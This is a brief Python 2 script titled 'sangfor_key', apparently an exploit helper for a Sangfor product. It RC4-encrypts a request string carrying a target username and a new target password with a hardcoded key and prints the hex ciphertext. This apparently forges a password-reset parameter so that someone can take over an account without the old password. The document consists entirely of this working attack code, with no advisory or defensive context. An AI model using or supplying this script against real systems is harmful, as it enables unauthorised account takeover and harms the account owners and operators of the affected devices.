# sangfor_key

    ```
from Crypto.Cipher import ARC4
from binascii  import  a2b_hex

def   myRC4(data,key):

    rc41=ARC4.new(key)

    encrypted=rc41.encrypt(data)

    return  encrypted.encode('hex')

def rc4_decrpt_hex(data,key):

    rc41=ARC4.new(key)

    return  rc41.decrypt(a2b_hex(data))

key='20200720'

data=r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,'

print(myRC4(data,key))
```


